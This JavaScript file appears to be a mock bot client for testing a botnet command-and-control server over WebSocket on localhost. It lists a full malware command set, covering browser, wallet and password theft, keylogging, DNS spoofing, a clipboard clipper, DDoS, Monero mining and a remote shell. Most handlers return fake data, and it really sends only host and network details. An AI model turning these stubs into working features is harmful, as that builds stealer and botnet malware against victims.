const WebSocket = require('ws');
const os = require('os');
const crypto = require('crypto');

class TestBot {
    constructor(serverUrl = 'ws://localhost:8080') {
        this.serverUrl = serverUrl;
        this.ws = null;
        this.botId = null;
        this.isConnected = false;
    }

    connect() {
        console.log(`[BOT] Connecting to ${this.serverUrl}...`);
        
        this.ws = new WebSocket(this.serverUrl);
        
        this.ws.on('open', () => {
            console.log('[BOT] Connected to server');
            this.isConnected = true;
            this.sendHandshake();
        });
        
        this.ws.on('message', (data) => {
            try {
                const message = JSON.parse(data);
                this.handleMessage(message);
            } catch (error) {
                console.error('[BOT] Error parsing message:', error);
            }
        });
        
        this.ws.on('close', () => {
            console.log('[BOT] Disconnected from server');
            this.isConnected = false;
        });
        
        this.ws.on('error', (error) => {
            console.error('[BOT] WebSocket error:', error);
        });
    }

    sendHandshake() {
        const systemInfo = {
            os: os.platform(),
            arch: os.arch(),
            version: os.release(),
            hostname: os.hostname(),
            cpu: os.cpus()[0].model,
            memory: os.totalmem(),
            uptime: os.uptime()
        };

        const capabilities = [
            'data_extraction',
            'screenshot',
            'keylogger',
            'command_execution',
            'file_operations',
            'system_info'
        ];

        this.send({
            type: 'handshake',
            data: {
                systemInfo: systemInfo,
                capabilities: capabilities,
                timestamp: new Date().toISOString()
            }
        });

        console.log('[BOT] Handshake sent');
    }

    handleMessage(message) {
        switch (message.type) {
            case 'welcome':
                this.botId = message.botId;
                console.log(`[BOT] Welcome! Bot ID: ${this.botId}`);
                break;
                
            case 'handshake_response':
                this.botId = message.botId;
                console.log(`[BOT] Welcome! Bot ID: ${this.botId}`);
                break;
                
            case 'command':
                this.handleCommand(message);
                break;
                
            case 'download_payload':
                this.handlePayloadDownload(message);
                break;
                
            default:
                console.log(`[BOT] Unknown message type: ${message.type}`);
        }
    }

    handleCommand(message) {
        console.log(`[BOT] Received command: ${message.action}`);
        
        switch (message.action) {
            case 'extract_browser_data':
                this.extractBrowserData(message.commandId);
                break;
                
            case 'extract_crypto_data':
                this.extractCryptoData(message.commandId);
                break;
                
            case 'extract_messaging_data':
                this.extractMessagingData(message.commandId);
                break;
                
            case 'extract_gaming_data':
                this.extractGamingData(message.commandId);
                break;
                
            case 'extract_password_data':
                this.extractPasswordData(message.commandId);
                break;
                
            case 'extract_cloud_data':
                this.extractCloudData(message.commandId);
                break;
                
            case 'take_screenshot':
                this.takeScreenshot(message.commandId);
                break;
                
            case 'start_keylogger':
                this.startKeylogger(message.commandId);
                break;
                
            case 'get_system_info':
                this.getSystemInfo(message.commandId);
                break;
                
            case 'execute_command':
                this.executeCommand(message.commandId, message.params);
                break;
                
            case 'add_bot':
                this.addBot(message.commandId);
                break;
                
            case 'stop_keylogger':
                this.stopKeylogger(message.commandId);
                break;
                
            case 'capture_screenshots':
                this.captureScreenshots(message.commandId);
                break;
                
            case 'get_system_insights':
                this.getSystemInsights(message.commandId);
                break;
                
            case 'start_dns_spoofing':
                this.startDnsSpoofing(message.commandId);
                break;
                
            case 'stop_dns_spoofing':
                this.stopDnsSpoofing(message.commandId);
                break;
                
            case 'start_reverse_proxy':
                this.startReverseProxy(message.commandId);
                break;
                
            case 'stop_reverse_proxy':
                this.stopReverseProxy(message.commandId);
                break;
                
            case 'start_clipper':
                this.startClipper(message.commandId);
                break;
                
            case 'stop_clipper':
                this.stopClipper(message.commandId);
                break;
                
            case 'start_ddos':
                this.startDdos(message.commandId);
                break;
                
            case 'stop_ddos':
                this.stopDdos(message.commandId);
                break;
                
            case 'start_mining':
                this.startMining(message.commandId);
                break;
                
            case 'stop_mining':
                this.stopMining(message.commandId);
                break;
                
            case 'create_task':
                this.createTask(message.commandId, message.params);
                break;
                
            case 'schedule_download':
                this.scheduleDownload(message.commandId, message.params);
                break;
                
            case 'setup_telegram':
                this.setupTelegram(message.commandId);
                break;
                
            case 'test_telegram':
                this.testTelegram(message.commandId);
                break;
                
            case 'open_remote_shell':
                this.openRemoteShell(message.commandId);
                break;
                
            case 'start_proxy':
                this.startProxy(message.commandId);
                break;
                
            case 'stop_proxy':
                this.stopProxy(message.commandId);
                break;
                
            default:
                this.sendCommandResult(message.commandId, 'error', `Unknown command: ${message.action}`);
        }
    }

    extractBrowserData(commandId) {
        // Simulate browser data extraction
        const browserData = {
            type: 'browser',
            browser: 'Chrome',
            entries: [
                {
                    url: 'https://example.com',
                    username: 'testuser',
                    password: 'testpass123',
                    timestamp: new Date().toISOString()
                },
                {
                    url: 'https://bank.com',
                    username: 'bankuser',
                    password: 'bankpass456',
                    timestamp: new Date().toISOString()
                }
            ]
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: browserData
        });

        console.log(`[BOT] Extracted ${browserData.entries.length} browser entries`);
    }

    extractCryptoData(commandId) {
        // Simulate crypto wallet data extraction
        const cryptoData = {
            type: 'crypto',
            wallets: [
                {
                    wallet: 'MetaMask',
                    address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6',
                    balance: '2.5 ETH',
                    tokens: ['ETH', 'USDC', 'UNI'],
                    timestamp: new Date().toISOString()
                },
                {
                    wallet: 'Trust Wallet',
                    address: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
                    balance: '0.15 BTC',
                    tokens: ['BTC', 'LTC'],
                    timestamp: new Date().toISOString()
                }
            ]
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: cryptoData
        });

        console.log(`[BOT] Extracted ${cryptoData.wallets.length} crypto wallets`);
    }

    extractMessagingData(commandId) {
        // Simulate messaging app data extraction
        const messagingData = {
            type: 'messaging',
            platforms: [
                {
                    platform: 'Telegram',
                    contacts: 45,
                    messages: 1234,
                    groups: 8,
                    lastActivity: new Date().toISOString()
                },
                {
                    platform: 'Discord',
                    servers: 12,
                    messages: 5678,
                    friends: 23,
                    lastActivity: new Date().toISOString()
                },
                {
                    platform: 'WhatsApp',
                    contacts: 67,
                    messages: 2345,
                    groups: 5,
                    lastActivity: new Date().toISOString()
                }
            ]
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: messagingData
        });

        console.log(`[BOT] Extracted messaging data from ${messagingData.platforms.length} platforms`);
    }

    extractGamingData(commandId) {
        // Simulate gaming platform data extraction
        const gamingData = {
            type: 'gaming',
            platforms: [
                {
                    platform: 'Steam',
                    games: 45,
                    playtime: '234 hours',
                    achievements: 156,
                    friends: 23,
                    lastPlayed: new Date().toISOString()
                },
                {
                    platform: 'Epic Games',
                    games: 12,
                    playtime: '89 hours',
                    achievements: 34,
                    friends: 8,
                    lastPlayed: new Date().toISOString()
                },
                {
                    platform: 'Battle.net',
                    games: 8,
                    playtime: '456 hours',
                    achievements: 78,
                    friends: 15,
                    lastPlayed: new Date().toISOString()
                }
            ]
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: gamingData
        });

        console.log(`[BOT] Extracted gaming data from ${gamingData.platforms.length} platforms`);
    }

    extractPasswordData(commandId) {
        // Simulate password manager data extraction
        const passwordData = {
            type: 'passwords',
            managers: [
                {
                    manager: 'LastPass',
                    entries: 156,
                    categories: ['Banking', 'Social', 'Work', 'Personal'],
                    lastSync: new Date().toISOString()
                },
                {
                    manager: '1Password',
                    entries: 89,
                    categories: ['Finance', 'Email', 'Shopping'],
                    lastSync: new Date().toISOString()
                },
                {
                    manager: 'Bitwarden',
                    entries: 234,
                    categories: ['Gaming', 'Streaming', 'Education'],
                    lastSync: new Date().toISOString()
                }
            ]
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: passwordData
        });

        console.log(`[BOT] Extracted password data from ${passwordData.managers.length} managers`);
    }

    extractCloudData(commandId) {
        // Simulate cloud storage data extraction
        const cloudData = {
            type: 'cloud',
            services: [
                {
                    service: 'Google Drive',
                    files: 1234,
                    storage: '15.2 GB',
                    folders: 45,
                    lastSync: new Date().toISOString()
                },
                {
                    service: 'Dropbox',
                    files: 567,
                    storage: '8.7 GB',
                    folders: 23,
                    lastSync: new Date().toISOString()
                },
                {
                    service: 'OneDrive',
                    files: 890,
                    storage: '12.1 GB',
                    folders: 34,
                    lastSync: new Date().toISOString()
                },
                {
                    service: 'iCloud',
                    files: 345,
                    storage: '5.3 GB',
                    folders: 12,
                    lastSync: new Date().toISOString()
                }
            ]
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: cloudData
        });

        console.log(`[BOT] Extracted cloud data from ${cloudData.services.length} services`);
    }

    addBot(commandId) {
        const botData = {
            type: 'bot_added',
            botId: `bot_${Date.now()}`,
            status: 'online',
            capabilities: ['data_extraction', 'keylogger', 'screenshot', 'command_execution'],
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: botData
        });

        console.log(`[BOT] Added new bot: ${botData.botId}`);
    }

    stopKeylogger(commandId) {
        const keylogData = {
            type: 'keylogger_stopped',
            duration: '2h 15m',
            totalKeystrokes: 15420,
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: keylogData
        });

        console.log('[BOT] Keylogger stopped');
    }

    captureScreenshots(commandId) {
        const screenshots = [
            'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
            'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
            'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=='
        ];

        this.send({
            type: 'screenshot',
            commandId: commandId,
            data: screenshots
        });

        console.log(`[BOT] Captured ${screenshots.length} screenshots`);
    }

    getSystemInsights(commandId) {
        const insights = {
            type: 'system_insights',
            cpu: { usage: '45%', cores: 8, temperature: '62°C' },
            memory: { usage: '67%', total: '16GB', available: '5.2GB' },
            disk: { usage: '78%', total: '1TB', available: '220GB' },
            network: { upload: '2.3Mbps', download: '15.7Mbps', connections: 23 },
            processes: { total: 156, suspicious: 3, high_cpu: 2 },
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: insights
        });

        console.log('[BOT] System insights collected');
    }

    startDnsSpoofing(commandId) {
        const dnsData = {
            type: 'dns_spoofing_started',
            target_domains: ['bank.com', 'paypal.com', 'amazon.com'],
            redirect_to: '192.168.1.100',
            status: 'active',
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: dnsData
        });

        console.log('[BOT] DNS spoofing started');
    }

    stopDnsSpoofing(commandId) {
        const dnsData = {
            type: 'dns_spoofing_stopped',
            duration: '1h 30m',
            requests_intercepted: 234,
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: dnsData
        });

        console.log('[BOT] DNS spoofing stopped');
    }

    startReverseProxy(commandId) {
        const proxyData = {
            type: 'reverse_proxy_started',
            local_port: 8080,
            target_host: '192.168.1.50',
            target_port: 80,
            status: 'active',
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: proxyData
        });

        console.log('[BOT] Reverse proxy started');
    }

    stopReverseProxy(commandId) {
        const proxyData = {
            type: 'reverse_proxy_stopped',
            duration: '45m',
            requests_proxied: 156,
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: proxyData
        });

        console.log('[BOT] Reverse proxy stopped');
    }

    startClipper(commandId) {
        const clipperData = {
            type: 'clipper_started',
            target_wallets: ['BTC', 'ETH', 'LTC'],
            replacement_addresses: {
                'BTC': '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
                'ETH': '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6',
                'LTC': 'LTC1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'
            },
            status: 'active',
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: clipperData
        });

        console.log('[BOT] Clipper started');
    }

    stopClipper(commandId) {
        const clipperData = {
            type: 'clipper_stopped',
            duration: '3h 20m',
            addresses_replaced: 12,
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: clipperData
        });

        console.log('[BOT] Clipper stopped');
    }

    startDdos(commandId) {
        const ddosData = {
            type: 'ddos_started',
            target: '192.168.1.100',
            method: 'TCP_SYN_FLOOD',
            threads: 50,
            status: 'active',
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: ddosData
        });

        console.log('[BOT] DDoS attack started');
    }

    stopDdos(commandId) {
        const ddosData = {
            type: 'ddos_stopped',
            duration: '10m',
            packets_sent: 125000,
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: ddosData
        });

        console.log('[BOT] DDoS attack stopped');
    }

    startMining(commandId) {
        const miningData = {
            type: 'mining_started',
            algorithm: 'RandomX',
            pool: 'pool.minexmr.com:4444',
            wallet: '4AdUndXHHZ6cFfR8vJQT3hi6W6DmbkQxVCxNtxQADFCg6fGnxM2J2c9HML31gX7ZkdkvWoYeh3zMtdbSr7sHA1xWbU8sW0',
            hashrate: '2.5 KH/s',
            status: 'active',
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: miningData
        });

        console.log('[BOT] Mining started');
    }

    stopMining(commandId) {
        const miningData = {
            type: 'mining_stopped',
            duration: '6h 45m',
            hashes_computed: 54000000,
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: miningData
        });

        console.log('[BOT] Mining stopped');
    }

    createTask(commandId, params) {
        const taskData = {
            type: 'task_created',
            task_name: params?.taskName || 'scheduled_task',
            schedule: params?.schedule || 'daily',
            command: params?.command || 'system_info',
            status: 'scheduled',
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: taskData
        });

        console.log(`[BOT] Task created: ${taskData.task_name}`);
    }

    scheduleDownload(commandId, params) {
        const downloadData = {
            type: 'download_scheduled',
            url: params?.url || 'https://example.com/file.exe',
            destination: params?.destination || 'C:\\temp\\',
            schedule: params?.schedule || 'immediate',
            status: 'scheduled',
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: downloadData
        });

        console.log(`[BOT] Download scheduled: ${downloadData.url}`);
    }

    setupTelegram(commandId) {
        const telegramData = {
            type: 'telegram_setup',
            bot_token: '123456789:ABCdefGHIjklMNOpqrsTUVwxyz',
            chat_id: '-1001234567890',
            commands: ['/start', '/status', '/info'],
            status: 'configured',
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: telegramData
        });

        console.log('[BOT] Telegram bot configured');
    }

    testTelegram(commandId) {
        const telegramData = {
            type: 'telegram_test',
            message_sent: 'Bot is online and responding',
            response_time: '0.5s',
            status: 'success',
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: telegramData
        });

        console.log('[BOT] Telegram test successful');
    }

    openRemoteShell(commandId) {
        const shellData = {
            type: 'remote_shell_opened',
            shell_type: 'cmd',
            session_id: `shell_${Date.now()}`,
            status: 'active',
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: shellData
        });

        console.log('[BOT] Remote shell opened');
    }

    startProxy(commandId) {
        const proxyData = {
            type: 'proxy_started',
            proxy_type: 'HTTP',
            port: 8080,
            status: 'active',
            connections: 0,
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: proxyData
        });

        console.log('[BOT] Proxy server started');
    }

    stopProxy(commandId) {
        const proxyData = {
            type: 'proxy_stopped',
            duration: '2h 15m',
            total_connections: 89,
            timestamp: new Date().toISOString()
        };

        this.send({
            type: 'data_extraction',
            commandId: commandId,
            data: proxyData
        });

        console.log('[BOT] Proxy server stopped');
    }

    takeScreenshot(commandId) {
        // Simulate screenshot (base64 encoded image)
        const screenshotData = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
        
        this.send({
            type: 'screenshot',
            commandId: commandId,
            data: screenshotData
        });

        console.log('[BOT] Screenshot taken');
    }

    startKeylogger(commandId) {
        // Simulate keylogger data
        const keylogData = 'User typed: password123, then pressed Enter';
        
        this.send({
            type: 'keylog',
            commandId: commandId,
            data: keylogData
        });

        console.log('[BOT] Keylog data sent');
    }

    getSystemInfo(commandId) {
        const systemInfo = {
            os: os.platform(),
            arch: os.arch(),
            version: os.release(),
            hostname: os.hostname(),
            cpu: os.cpus()[0].model,
            memory: os.totalmem(),
            uptime: os.uptime(),
            network: os.networkInterfaces()
        };

        this.sendCommandResult(commandId, 'success', JSON.stringify(systemInfo, null, 2));
        console.log('[BOT] System info sent');
    }

    executeCommand(commandId, params) {
        const { command } = params || {};
        
        // Simulate command execution
        const result = `Command executed: ${command}\nOutput: Command completed successfully\nExit code: 0`;
        
        this.sendCommandResult(commandId, 'success', result);
        console.log(`[BOT] Command executed: ${command}`);
    }

    handlePayloadDownload(message) {
        console.log(`[BOT] Downloading payload: ${message.filename}`);
        // In a real bot, this would download and execute the payload
        this.sendCommandResult(message.commandId || 'download', 'success', `Payload ${message.filename} downloaded successfully`);
    }

    sendCommandResult(commandId, result, details) {
        this.send({
            type: 'command_result',
            commandId: commandId,
            result: result,
            details: details,
            timestamp: new Date().toISOString()
        });
    }

    send(message) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify(message));
        }
    }

    disconnect() {
        if (this.ws) {
            this.ws.close();
        }
    }
}

// Create and connect test bot
const bot = new TestBot();
bot.connect();

// Keep the bot running
process.on('SIGINT', () => {
    console.log('\n[BOT] Shutting down...');
    bot.disconnect();
    process.exit(0);
});

console.log('[BOT] Test bot started. Press Ctrl+C to exit.');
